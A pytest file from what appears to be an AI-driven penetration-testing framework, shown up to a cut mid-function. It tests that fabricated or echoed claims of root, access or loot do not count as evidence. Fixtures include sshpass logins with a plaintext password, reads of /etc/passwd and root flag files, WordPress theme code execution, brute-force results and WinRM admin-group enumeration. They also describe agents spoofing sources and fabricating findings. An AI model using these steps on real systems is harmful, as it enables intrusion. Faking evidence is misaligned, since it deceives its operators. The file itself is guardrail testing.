"""P0-4: model assertions cannot authenticate themselves."""
from nexus_core.agent.planner import build_plan
from nexus_core.agent.evidence import annotate_findings, fabricated_evidence
from nexus_core.report.extractor import _fact_findings


def test_unverified_fact_does_not_advance_plan():
    facts = [dict(fact_type=t, verified=False, asserted_by='agent')
             for t in ('host', 'endpoint', 'access', 'privilege', 'artifact')]
    assert build_plan(facts=facts).current == 'recon'


def test_phase_evidence_requires_verified_facts():
    assert build_plan(facts=[dict(fact_type='host', verified=True, asserted_by='agent')]).current == 'recon'


def test_shared_ip_does_not_ground_root_claim():
    findings, stats = annotate_findings([{'title':'10.10.10.10 root confirmed'}],
                                       observations=[{'output':{'host':'10.10.10.10'}}])
    assert stats['grounded'] == 0
    assert fabricated_evidence(stats)


def test_finding_requires_invocation_reference():
    _, stats = annotate_findings([{'title':'host observed', 'target':'10.0.0.1','fact_type':'host'}],
                                 observations=[{'target':'10.0.0.1','fact_type':'host','verified':True}])
    assert stats['grounded'] == 0


def test_report_distinguishes_confirmed_and_hypothesis():
    facts = [dict(fact_type='access',key='host',value={},verified=False,asserted_by='agent'),
             dict(fact_type='privilege',key='root',value={},verified=True,asserted_by='verifier',
                  verification_method='uid_zero',invocation_id='i1')]
    rows = _fact_findings(facts)
    assert rows[0].verification_status == 'hypothesis'
    assert rows[1].verification_status == 'confirmed_finding'


def test_mixed_stale_and_grounded_blocks_completion():
    assert fabricated_evidence({'stale':1,'grounded':1,'corpus_tokens':5})


def test_the_current_run_and_a_real_invocation_are_required():
    """The invocation is the identity of a citation (V1-50).

    A different run never grounds, and neither does an id that is not in the
    corpus. The type and the target only *rank* the observation that carries
    that invocation: the finding is then rewritten with the observation's
    typed fact, so the model's version never becomes evidence.
    """
    observation = dict(invocation_id='i1',run_id='r1',target='10.0.0.1',
                       fact_type='host',verified=True,verification_method='nmap_xml')
    finding = dict(title='observed host',invocation_id='i1',target='10.0.0.1',fact_type='host')
    _, stats = annotate_findings([finding],observations=[observation],run_id='r1')
    assert stats['grounded'] == 1
    for change in ({'run_id':'r2'}, {'invocation_id':'i2'}):
        _, stats = annotate_findings([finding],observations=[{**observation,**change}],run_id='r1')
        assert stats['grounded'] == 0
    for change in ({'target':'10.0.0.2'}, {'fact_type':'privilege'}):
        annotated, stats = annotate_findings(
            [finding], observations=[{**observation, **change}], run_id='r1'
        )
        assert stats['grounded'] == 1
        assert annotated[0]['fact_type'] == change.get('fact_type', 'host')
        assert annotated[0]['target'] == change.get('target', '10.0.0.1')


def test_model_cannot_promote_fact_or_spoof_source(tmp_path):
    import asyncio
    from types import SimpleNamespace
    from nexus_core.kernel.control_store import ControlStore
    from nexus_core.tools.handlers.knowledge_facts import record_fact_handler
    store = ControlStore(tmp_path / 'facts.db')
    store.initialize()
    context = SimpleNamespace(store=store, tenant_id='system', scope=SimpleNamespace(engagement_id='eng'),
                              identity=SimpleNamespace(subject_id='model'))
    result = asyncio.run(record_fact_handler(dict(fact_type='privilege', key='root',
                        source='deterministic-verifier', verified=True), context))
    fact = result.output['recorded']
    assert fact['verified'] is False and fact['asserted_by'] == 'agent'
    assert fact['source'] == 'agent'
    # The refusal is answered, not silent: a model that believed it had just
    # promoted the fact kept treating it as evidence (measured in
    # run_7661dda481784eebb17a76e037c5722b, 2026-10-20).
    assert result.output['verified'] is False
    assert 'verified=false' in result.output['warning']


def test_verifier_does_not_promote_echoed_root():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i',run_id='r')
    def assertions(command):
        result = ToolResult(output=dict(target='10.0.0.1',command=command,stdout='root',exit_status=0),
                            verified=True,verification_method='ssh_exec_completed')
        return derive_assertions('nexus.post.ssh_exec',{},result,context)
    assert {f['fact_type'] for f in assertions('echo root')} == {'access'}
    assert {f['fact_type'] for f in assertions('whoami')} == {'access','privilege'}


def test_verifier_promotes_a_pivoted_credential_on_the_scoped_host(tmp_path, monkeypatch):
    monkeypatch.setenv('NEXUS_VAULT_ROOT', str(tmp_path / 'vault'))
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output=dict(
            target='10.66.156.56',
            form_url='http://127.0.0.1:8080/j_acegi_security_check',
            valid_credentials=[{'username': 'admin', 'password': 'p', 'service': 'http-pivot'}],
        ),
        verified=True,
        verification_method='pivot_credential_validated',
    )
    facts = derive_assertions('nexus.post.pivot_bruteforce', {}, result, context)
    # A validated password is not a session: the fact carries the handle, and no
    # ``access`` is derived from it (V1-29/V1-31).
    assert {fact['fact_type'] for fact in facts} == {'credential'}
    # The fact is keyed on the host the engagement actually authorises, never on
    # the pivoted loopback endpoint.
    assert {fact['target'] for fact in facts} == {'10.66.156.56'}
    credential = next(fact for fact in facts if fact['fact_type'] == 'credential')
    assert 'password' not in credential['value']
    assert credential['value']['secret_ref'].startswith('vault:')
    from nexus_core.kernel.secret_store import default_secret_store

    assert default_secret_store().get(credential['value']['secret_ref']) == b'p'


def test_verifier_promotes_nothing_from_a_completed_sweep():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output=dict(target='10.66.156.56', form_url='http://127.0.0.1:8080/x', valid_credentials=[]),
        verified=True,
        verification_method='pivot_bruteforce_completed',
    )
    assert derive_assertions('nexus.post.pivot_bruteforce', {}, result, context) == []


def test_recorded_verified_fact_requires_provenance(tmp_path):
    import pytest
    from nexus_core.kernel.control_store import ControlStore
    from nexus_core.kernel.blackboard import Blackboard
    store = ControlStore(tmp_path / 'facts.db')
    store.initialize()
    with pytest.raises(ValueError, match='verifier'):
        Blackboard(store).record(tenant_id='system', engagement_id='eng', fact_type='host',key='h',
                                 value={},source='agent',created_by='agent',verified=True)


def test_valid_host_reference_does_not_verify_arbitrary_model_prose():
    proof = dict(invocation_id='i',run_id='r',target='host',fact_type='host',value={'state':'up'},
                 verified=True,verification_method='nmap_xml_parsed')
    rows, _ = annotate_findings([dict(invocation_id='i',target='host',fact_type='host',
                                      title='SQL injection confirmed',severity='critical')],
                                observations=[proof],run_id='r')
    assert rows[0]['title'] == 'host: host'
    assert rows[0]['value'] == {'state':'up'}
    assert rows[0]['declared_finding']['verification_status'] == 'hypothesis'
    assert rows[0]['declared_finding']['verified'] is False


def test_ret2libc_root_command_yields_privilege_and_loot():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(output=dict(target='10.0.0.1', flag='flag{fake_flag}', libc_base=0x1000),
                        verified=True, verification_method='ret2libc_root_command')
    rows = derive_assertions('nexus.pwn.ret2libc', {}, result, context)
    assert {r['fact_type'] for r in rows} == {'privilege', 'loot'}
    assert all(r['asserted_by'] == 'verifier' for r in rows)


def test_wp_enum_yields_web_app_user_and_vulnerability_facts():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output={
            'url': 'http://internal.thm/blog',
            'findings': {
                'version': '5.4.2',
                'version_source': 'meta_generator',
                'users': [{'id': 1, 'slug': 'admin'}],
                'interesting': [{'id': 'wp_xmlrpc_enabled', 'severity': 'medium'}],
            },
            'probes': [{'path': '/xmlrpc.php', 'status': 405, 'length': 42}],
        },
        verified=True,
        verification_method='wp_enum_completed',
    )
    rows = derive_assertions('nexus.web.wp_enum', {}, result, context)
    kinds = {row['fact_type'] for row in rows}
    assert kinds == {'web_app', 'user', 'vulnerability', 'endpoint'}
    assert all(row['asserted_by'] == 'verifier' for row in rows)
    assert next(r for r in rows if r['fact_type'] == 'web_app')['value']['version'] == '5.4.2'


def test_wp_bruteforce_promotes_the_validated_credential():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output={
            'url': 'http://internal.thm/blog',
            'username': 'admin',
            'valid_credentials': [{'username': 'admin', 'password': 'secret', 'transport': 'xmlrpc'}],
        },
        verified=True,
        verification_method='wp_credential_validated',
    )
    rows = derive_assertions('nexus.web.wp_bruteforce', {'username': 'admin'}, result, context)
    # The validated wp-admin password is a credential, not a session (V1-31), and
    # it reaches the blackboard as a handle (V1-29).
    assert {row['fact_type'] for row in rows} == {'credential'}
    credential = next(r for r in rows if r['fact_type'] == 'credential')
    assert 'password' not in credential['value']
    assert credential['value']['secret_ref'].startswith('vault:')


def test_wp_exec_promotes_access_privilege_and_loot():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output={
            'url': 'http://internal.thm/blog',
            'theme': 'twentyseventeen',
            'file': '404.php',
            'outputs': [
                {'command': 'id', 'stdout': 'uid=33(www-data) gid=33(www-data)'},
                {'command': 'cat /root/root.txt', 'stdout': 'flag{fake_flag}'},
            ],
        },
        verified=True,
        verification_method='wp_command_executed',
    )
    rows = derive_assertions('nexus.web.wp_exec', {}, result, context)
    kinds = {row['fact_type'] for row in rows}
    assert kinds == {'access', 'loot'}
    loot = next(r for r in rows if r['fact_type'] == 'loot')
    assert loot['value']['flag'] == 'flag{fake_flag}'


def test_wp_exec_promotes_root_when_id_reports_uid_zero():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output={
            'url': 'http://internal.thm/blog',
            'outputs': [{'command': 'id', 'stdout': 'uid=0(root) gid=0(root) groups=0(root)'}],
        },
        verified=True,
        verification_method='wp_command_executed',
    )
    rows = derive_assertions('nexus.web.wp_exec', {}, result, context)
    assert 'privilege' in {row['fact_type'] for row in rows}


def test_wp_exec_echoed_uid_does_not_promote_privilege():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output={
            'url': 'http://internal.thm/blog',
            'outputs': [{'command': 'echo uid=0(root)', 'stdout': 'uid=0(root) gid=0(root)'}],
        },
        verified=True,
        verification_method='wp_command_executed',
    )
    rows = derive_assertions('nexus.web.wp_exec', {}, result, context)
    assert {row['fact_type'] for row in rows} == {'access'}


def _winrm_rows(command, stdout, *, domain='windcorp.thm', username='buse',
                verification_method='winrm_command_executed'):
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output={'target': '10.66.164.10', 'command': command, 'stdout': stdout,
                'executed': True, 'authenticated': True},
        verified=True,
        verification_method=verification_method,
    )
    return derive_assertions('nexus.win.winrm_exec',
                             {'username': username, 'domain': domain}, result, context)


def test_winrm_promotes_only_access_for_a_plain_command():
    rows = _winrm_rows('whoami; hostname', 'windcorp\\buse\nWINBLACK')
    assert {row['fact_type'] for row in rows} == {'access'}
    assert rows[0]['value'] == {'transport': 'winrm', 'username': 'buse', 'domain': 'windcorp.thm'}


def test_winrm_identity_query_naming_an_admin_group_promotes_privilege():
    stdout = ('WINDOMAIN\\buse\n\nGROUP INFORMATION\n-----------------\n'
              'BUILTIN\\Administrators   Alias   S-1-5-32-544')
    rows = _winrm_rows('whoami /groups', stdout)
    assert {row['fact_type'] for row in rows} == {'access', 'privilege'}


def test_winrm_echoed_admin_group_does_not_promote_privilege():
    rows = _winrm_rows('echo Domain Admins', 'Domain Admins')
    assert {row['fact_type'] for row in rows} == {'access'}


def test_winrm_unverified_execution_promotes_nothing():
    assert _winrm_rows('whoami /groups', 'BUILTIN\\Administrators',
                       verification_method='winrm_authentication_failed') == []


def test_winrm_domain_group_listing_promotes_each_member_account():
    stdout = ('Alias name     Administrators\nComment        Administrators have complete and '
              'unrestricted access\n\nMembers\n\n'
              '-------------------------------------------------------------------------------\n'
              'Administrator\nDomain Admins\n*tom\nThe command completed successfully.\n')
    rows = _winrm_rows('net localgroup Administrators /domain', stdout)
    keys = {row['key'] for row in rows if row['fact_type'] == 'privilege'}
    # Group rows are not accounts, and the account is keyed on the domain it lives in.
    assert keys == {'domain-admin:Administrator@windcorp.thm', 'domain-admin:tom@windcorp.thm'}
    assert all(row['asserted_by'] == 'verifier' for row in rows)


def test_winrm_local_group_listing_without_domain_promotes_no_privilege():
    stdout = ('Members\n\n----\ntom\nThe command completed successfully.\n')
    rows = _winrm_rows('net localgroup Administrators', stdout)
    assert {row['fact_type'] for row in rows} == {'access'}


def test_winrm_non_admin_group_listing_promotes_no_privilege():
    stdout = ('Members\n\n----\ntom\nThe command completed successfully.\n')
    rows = _winrm_rows('net group "Remote Desktop Users" /domain', stdout)
    assert {row['fact_type'] for row in rows} == {'access'}


def test_winrm_single_file_read_promotes_the_flag_at_its_path():
    rows = _winrm_rows('Get-Content "C:\\Users\\buse\\Desktop\\Flag 2.txt"',
                       'flag{fake_flag}')
    loot = [row for row in rows if row['fact_type'] == 'loot']
    assert len(loot) == 1
    assert loot[0]['key'] == 'C:\\Users\\buse\\Desktop\\Flag 2.txt'
    assert loot[0]['value']['flag'] == 'flag{fake_flag}'


def test_winrm_looping_read_does_not_attach_the_flag_to_a_path():
    command = 'Get-ChildItem C:\\Users\\Administrator\\Desktop | ForEach-Object { Get-Content $_.FullName }'
    rows = _winrm_rows(command, 'flag{fake_flag}')
    assert {row['fact_type'] for row in rows} == {'access'}


def _bruteforce_rows(valid_credentials, *, service='ssh',
                     verification_method='cred_bruteforce_completed'):
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output=dict(target='10.64.175.30', service=service, port=22, username='lin',
                    valid_credentials=valid_credentials),
        verified=True, verification_method=verification_method)
    return derive_assertions('nexus.cred.bruteforce', {}, result, context)


def test_verifier_promotes_a_validated_bruteforce_credential(tmp_path, monkeypatch):
    """A hit is a credential with a handle -never an access fact (V1-29/V1-31)."""
    monkeypatch.setenv('NEXUS_VAULT_ROOT', str(tmp_path / 'vault'))
    rows = _bruteforce_rows([{'host': '10.64.175.30', 'username': 'lin',
                              'password': 'synthetic-password'}])
    assert {row['fact_type'] for row in rows} == {'credential'}
    credential = next(row for row in rows if row['fact_type'] == 'credential')
    assert credential['value']['username'] == 'lin'
    assert credential['value']['service'] == 'ssh'
    assert 'password' not in credential['value']
    handle = credential['value']['secret_ref']
    assert handle.startswith('vault:')
    from nexus_core.kernel.secret_store import default_secret_store

    assert default_secret_store().get(handle) == b'synthetic-password'
    assert all(row['asserted_by'] == 'verifier' for row in rows)


def test_verifier_keeps_the_handle_a_handler_already_issued(tmp_path, monkeypatch):
    """The verifier never re-stores a secret: it propagates the handler's ref."""
    monkeypatch.setenv('NEXUS_VAULT_ROOT', str(tmp_path / 'vault'))
    from nexus_core.kernel.secret_store import default_secret_store

    handle = default_secret_store().put(b'synthetic-password')
    rows = _bruteforce_rows([{'host': '10.64.175.30', 'username': 'lin',
                              'secret_ref': handle}])
    credential = next(row for row in rows if row['fact_type'] == 'credential')
    assert credential['value']['secret_ref'] == handle
    assert credential['value']['username'] == 'lin'


def test_verifier_promotes_nothing_from_an_empty_credential_sweep():
    # ``cred_bruteforce_completed`` with no hit is a valid negative, not evidence:
    # promoting it would advance the kill chain on a sweep that proved nothing.
    assert _bruteforce_rows([]) == []


def test_verifier_promotes_a_flag_read_over_ssh():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output=dict(target='10.64.175.30', command='cat /home/lin/Desktop/user.txt',
                    stdout='flag{fake_flag}', exit_status=0),
        verified=True, verification_method='ssh_exec_completed')
    loot = [row for row in derive_assertions('nexus.post.ssh_exec', {}, result, context)
            if row['fact_type'] == 'loot']
    assert [row['value']['flag'] for row in loot] == ['flag{fake_flag}']


def test_verifier_ssh_without_a_flag_promotes_no_loot():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output=dict(target='10.64.175.30', command='echo hello', stdout='hello',
                    exit_status=0),
        verified=True, verification_method='ssh_exec_completed')
    rows = derive_assertions('nexus.post.ssh_exec', {}, result, context)
    assert {row['fact_type'] for row in rows} == {'access'}


def _ssh_read(command, stdout, *, target='10.64.175.30', exit_status=0):
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output=dict(target=target, command=command, stdout=stdout, exit_status=exit_status),
        verified=True, verification_method='ssh_exec_completed')
    return derive_assertions('nexus.post.ssh_exec', {}, result, context)


def test_verifier_promotes_a_plain_text_flag_read_over_ssh():
    """Simple CTF: ``user.txt`` holds ``G00d j0b, keep up!``, with no flag{fake_flag} shape.

    The read is verified (exit 0) and the path is a conventional flag file, so
    the engine must record the capture instead of waiting for a prefix that this
    room never uses.
    """
    from nexus_core.agent.planner import loot_is_evidence

    rows = _ssh_read('cat ~/user.txt', 'G00d j0b, keep up!\n')
    loot = [row for row in rows if row['fact_type'] == 'loot']

    assert len(loot) == 1
    assert loot[0]['value']['content'] == 'G00d j0b, keep up!'
    assert loot[0]['value']['flag'] == 'G00d j0b, keep up!'
    assert loot[0]['value']['path'] == '~/user.txt'
    assert loot[0]['verified'] is True
    assert loot[0]['verification_method'] == 'ssh_exec_completed'
    # The planner reads it as captured loot even though it is not flag-shaped.
    assert loot_is_evidence(loot[0]['value']) is True


def test_verifier_promotes_root_txt_read_through_sudo():
    loot = [row for row in _ssh_read('sudo cat /root/root.txt', 'W3ll d0n3. You made it!')
            if row['fact_type'] == 'loot']

    assert [row['value']['content'] for row in loot] == ['W3ll d0n3. You made it!']
    assert loot[0]['value']['path'] == '/root/root.txt'


def test_verifier_promotes_facts_from_the_sshpass_fallback_too():
    """Plan B is a real channel: the same access/loot facts must be derived.

    Simple CTF runs 1 and 2: the paramiko login was refused although the
    credential was valid and the command was replayed over ``sshpass``. A
    verified fallback that derived nothing would leave the board blind to an
    access the engine did establish.
    """
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions

    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output=dict(target='10.64.128.102', command='cat ~/user.txt',
                    stdout='G00d j0b, keep up!\n', exit_status=0),
        verified=True, verification_method='ssh_exec_sshpass_completed')
    rows = derive_assertions(
        'nexus.post.ssh_exec', {'username': 'mitch'}, result, context
    )

    assert {row['fact_type'] for row in rows} == {'access', 'loot'}
    access = next(row for row in rows if row['fact_type'] == 'access')
    # The port rides with the access fact (``None`` when the call omitted it), so
    # the handlers can complete a later call from the board.
    assert access['value'] == {'transport': 'ssh', 'username': 'mitch', 'port': None}
    loot = next(row for row in rows if row['fact_type'] == 'loot')
    assert loot['value']['content'] == 'G00d j0b, keep up!'


def test_verifier_records_the_port_of_the_proved_session():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions

    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output=dict(target='10.64.128.102', command='id', stdout='uid=1001\n',
                    exit_status=0),
        verified=True, verification_method='ssh_exec_completed')
    rows = derive_assertions(
        'nexus.post.ssh_exec',
        {'username': 'mitch', 'port': 2222},
        result,
        context,
    )

    access = next(row for row in rows if row['fact_type'] == 'access')
    assert access['value']['port'] == 2222


def test_the_login_records_a_credential_the_next_turn_can_reuse(tmp_path, monkeypatch):
    """Continuity (V1-29): the password that authenticated becomes a handle.

    Without it the model retyped the secret on every turn -and in the Simple CTF
    run of 2026-10-17 (23:16 UTC) its hand-typed line was refused three turns
    before the run ended.
    """
    from types import SimpleNamespace
    from nexus_core.kernel.control_store import ControlStore
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions

    monkeypatch.setenv('NEXUS_VAULT_ROOT', str(tmp_path / 'vault'))
    store = ControlStore(tmp_path / 'facts.db')
    store.initialize()
    context = SimpleNamespace(
        invocation_id='i', run_id='r', store=store,
        tenant_id='system', engagement_id='eng-1',
    )
    result = ToolResult(
        output=dict(target='10.64.128.102', command='id', stdout='uid=1001(mitch)\n',
                    exit_status=0),
        verified=True, verification_method='ssh_exec_completed')
    arguments = {'username': 'mitch', 'password': 'secret', 'port': 2222}

    rows = derive_assertions('nexus.post.ssh_exec', arguments, result, context)
    credential = next(row for row in rows if row['fact_type'] == 'credential')
    assert credential['key'] == 'cred:ssh:mitch@10.64.128.102'
    assert credential['verified'] is True
    # The plaintext never reaches the fact: only the vault handle does.
    assert 'password' not in credential['value']
    handle = credential['value']['secret_ref']
    assert handle.startswith('vault:')
    from nexus_core.kernel.secret_store import default_secret_store

    assert default_secret_store().get(handle, tenant_id='system') == b'secret'

    # A second successful call reuses the handle instead of storing the secret
    # again: one vault entry per proved (user, host) pair.
    from nexus_core.kernel.blackboard import Blackboard

    Blackboard(store).record(
        tenant_id='system', engagement_id='eng-1', fact_type='credential',
        key=credential['key'], value=credential['value'], source='verifier',
        created_by='verifier', verified=True, asserted_by='verifier',
        verification_method='ssh_exec_completed', invocation_id='i',
    )
    again = next(
        row for row in derive_assertions('nexus.post.ssh_exec', arguments, result, context)
        if row['fact_type'] == 'credential'
    )
    assert again['value']['secret_ref'] == handle


def test_a_proved_directory_scan_closes_the_enumeration_phase():
    """The gobuster hit names its code ``status``: the wrong key derived nothing.

    Measured in Simple CTF (2026-10-17, 23:16 UTC): 11 hits from gobuster, 0
    assertions, and the plan stayed on ``enumeration`` for 27 turns because no
    verified ``endpoint`` ever reached the board.
    """
    from types import SimpleNamespace
    from nexus_core.agent.planner import build_plan
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions

    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output={
            'target': 'http://10.64.128.102/simple/',
            'hits': [
                {'path': 'admin', 'status': 301, 'size': 321},
                {'path': 'index.php', 'status': 200, 'size': 19993},
                {'path': 'uploads', 'status': 301, 'size': 323},
            ],
        },
        verified=True, verification_method='gobuster_text_parsed')

    rows = derive_assertions('nexus.recon.gobuster', {}, result, context)

    endpoints = [row for row in rows if row['fact_type'] == 'endpoint']
    assert [row['key'] for row in endpoints] == ['admin', 'index.php', 'uploads']
    assert all(row['verified'] for row in endpoints)
    # And the verified endpoint is what closes ``enumeration`` for the planner:
    # with recon done, the plan moves on to initial access by itself.
    facts = [
        dict(fact_type='host', key='10.64.128.102', value={'state': 'up'},
             verified=True, asserted_by='verifier'),
        dict(fact_type='service', key='10.64.128.102:80:tcp', value={'port': 80},
             verified=True, asserted_by='verifier'),
        *rows,
    ]
    plan = build_plan(facts=facts)
    assert plan.counts.get('endpoint') == 3
    assert plan.current == 'exploitation'
    assert dict((item.id, item.status) for item in plan.phases)['enumeration'] == 'done'


def test_verifier_does_not_call_every_read_loot():
    """Only a single read of a flag-named file is loot; a pipe or /etc/passwd is not."""
    for command, stdout in (
        ('cat /etc/passwd', 'root:x:0:0:root:/root:/bin/bash\n'),
        ('cat /root/root.txt | head -n 1', 'W3ll d0n3. You made it!'),
        ('echo G00d j0b, keep up!', 'G00d j0b, keep up!'),
        ('cat user.txt; ls', 'G00d j0b, keep up!'),
    ):
        rows = _ssh_read(command, stdout)
        assert {row['fact_type'] for row in rows} == {'access'}, command


def test_verifier_does_not_promote_loot_from_a_failed_read():
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    from types import SimpleNamespace

    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output=dict(target='10.64.175.30', command='cat /root/root.txt', stdout='',
                    exit_status=1),
        verified=False, outcome='command_failed',
        verification_method='ssh_exec_command_failed')

    assert derive_assertions('nexus.post.ssh_exec', {}, result, context) == []


def test_ret2libc_without_root_promotes_nothing():
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions
    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(output=dict(target='10.0.0.1'), verified=False,
                        verification_method='ret2libc_no_root')
    assert derive_assertions('nexus.pwn.ret2libc', {}, result, context) == []


# --------------------------- V1-49: ``nexus.shell.exec`` over an sshpass channel
def _shell_sshpass(command, summary, *, exit_code=0):
    """Assertions of a ``nexus.shell.exec`` call, shaped like the real handler."""
    from types import SimpleNamespace
    from nexus_core.kernel.models import ToolResult
    from nexus_core.kernel.fact_verification import derive_assertions

    context = SimpleNamespace(invocation_id='i', run_id='r')
    result = ToolResult(
        output=dict(summary=summary, exit_code=exit_code, timed_out=False,
                    cancelled=False, artifact_ref='artifact_x'),
        verified=exit_code == 0,
        verification_method='shell_exit_code',
        exit_code=exit_code,
    )
    return derive_assertions('nexus.shell.exec', {'command': command}, result, context)


def test_shell_exec_derives_access_and_a_credential_from_sshpass(tmp_path, monkeypatch):
    """The generic shell can run the same login ``ssh_exec`` makes; prove it.

    Measured in the Simple CTF run of 2026-10-17: the escalation went through
    ``sshpass`` in ``nexus.shell.exec``, the board never held ``access`` for that
    channel and the run closed as a budget failure with the room solved.
    """
    monkeypatch.setenv('NEXUS_VAULT_ROOT', str(tmp_path / 'vault'))

    rows = _shell_sshpass(
        "sshpass -p 'cyber' ssh -o StrictHostKeyChecking=no -p 2222 "
        "mitch@10.64.128.102 'id'",
        'uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)\n',
    )

    access = next(row for row in rows if row['fact_type'] == 'access')
    assert access['target'] == '10.64.128.102'
    assert access['value'] == {'transport': 'ssh', 'username': 'mitch',
                              'port': 2222, 'via': 'shell.exec'}
    assert access['verified'] is True
    assert access['verification_method'] == 'shell_sshpass_completed'
    # The password reaches the vault, never the board (V1-29).
    credential = next(row for row in rows if row['fact_type'] == 'credential')
    assert credential['key'] == 'cred:ssh:mitch@10.64.128.102'
    assert 'password' not in credential['value']
    from nexus_core.kernel.secret_store import default_secret_store

    assert default_secret_store().get(credential['value']['secret_ref']) == b'cyber'


def test_shell_exec_derives_root_and_the_plain_text_flag(tmp_path, monkeypatch):
    """``id`` + ``cat /root/root.txt`` over sshpass close the objective.

    Simple CTF's ``root.txt`` says ``W3ll d0n3. You made it!``: no prefix, so the
    capture is only visible through the read of the flag-named file.
    """
    from nexus_core.agent.planner import build_plan, objective_completion

    monkeypatch.setenv('NEXUS_VAULT_ROOT', str(tmp_path / 'vault'))
    identity = _shell_sshpass(
        "sshpass -p 'cyber' ssh -p 2222 mitch@10.64.128.102 'id'",
        'uid=0(root) gid=0(root) groups=0(root)\n',
    )
    capture = _shell_sshpass(
        "sshpass -p 'cyber' ssh -p 2222 mitch@10.64.128.102 'sudo cat /root/root.txt'",
        'W3ll d0n3. You made it!\n',
    )

    privilege = next(row for row in identity if row['fact_type'] == 'privilege')
    assert privilege['value']['uid'] == 0 and privilege['value']['user'] == 'root'
    assert privilege['verification_method'] == 'shell_sshpass_completed'
    loot = next(row for row in capture if row['fact_type'] == 'loot')
    assert loot['value']['content'] == 'W3ll d0n3. You made it!'
    assert loot['value']['path'] == '/root/root.txt'

    # And the engine now *sees* the win: the escalation phase is closed by its own
    # evidence and the board holds root + loot, which is what grants the budget
    # exemption (the run of 2026-10-17 died without either fact).
    facts = [
        dict(fact_type='host', key='10.64.128.102', value={'state': 'up'},
             verified=True, asserted_by='verifier', verification_method='nmap_xml_parsed',
             invocation_id='n'),
        dict(fact_type='service', key='10.64.128.102:2222:tcp', value={'port': 2222},
             verified=True, asserted_by='verifier', verification_method='nmap_xml_parsed',
             invocation_id='n'),
        *identity, *capture,
    ]
    plan = build_plan(facts=facts)
    statuses = {phase.id: phase.status for phase in plan.phases}
    assert statuses['exploitation'] == 'done'
    assert statuses['privilege_escalation'] == 'done'
    completion = objective_completion(facts)
    assert completion.complete is True
    assert completion.loot_refs == (loot['key'],)


def test_shell_exec_ignores_the_clients_own_warnings_when_reading_a_flag(tmp_path, monkeypatch):
    """``2>&1`` puts ssh's notices in front of the flag: they are not the file.

    Recorded shape of the Simple CTF run: the read reaches the shell with
    ``Warning: Permanently added …`` and the post-quantum notice before the flag.
    """
    monkeypatch.setenv('NEXUS_VAULT_ROOT', str(tmp_path / 'vault'))

    rows = _shell_sshpass(
        "sshpass -p 'cyber' ssh -p 2222 mitch@10.64.128.102 "
        "'cat /home/mitch/user.txt' 2>&1",
        "Warning: Permanently added '[10.64.128.102]:2222' (ED25519) to the list "
        "of known hosts.\r\n** WARNING: connection is not using a post-quantum key "
        "exchange algorithm.\r\n** This session may be vulnerable to \"store now, "
        "decrypt later\" attacks.\nG00d j0b, keep up!\n",
    )

    loot = next(row for row in rows if row['fact_type'] == 'loot')
    assert loot['value']['content'] == 'G00d j0b, keep up!'
    assert loot['value']['path'] == '/home/mitch/user.txt'


def test_shell_exec_does_not_attribute_several_lines_to_one_path(tmp_path, monkeypatch):
    monkeypatch.setenv('NEXUS_VAULT_ROOT', str(tmp_path / 'vault'))

    rows = _shell_sshpass(
